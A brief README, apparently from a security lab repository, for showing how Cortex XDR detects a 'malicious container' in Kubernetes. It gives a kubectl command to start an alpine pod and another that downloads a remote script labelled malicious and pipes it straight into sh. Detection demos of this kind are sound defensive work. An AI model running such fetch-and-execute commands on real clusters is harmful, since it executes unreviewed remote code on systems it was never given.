# Cortex XDR Malicous Container

## Malicous container guide 
*Outcome* - show capability of grauntlar 


## Working Tasks 

[X] test malicous contaienr script 
[X] Create dockerfile image 
[X] build container locally 
[X] test image locally 



## Create a container 

kubectl run malicious-container --image=alpine --restart=Never -- /bin/sh -c "while true; do sleep 30; done"

## exec into cntainer, donwoad and execute script

kubectl exec -it malicious-container -- /bin/sh -c "wget -qO- https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/malicous-container/malicous-container.sh | sh"

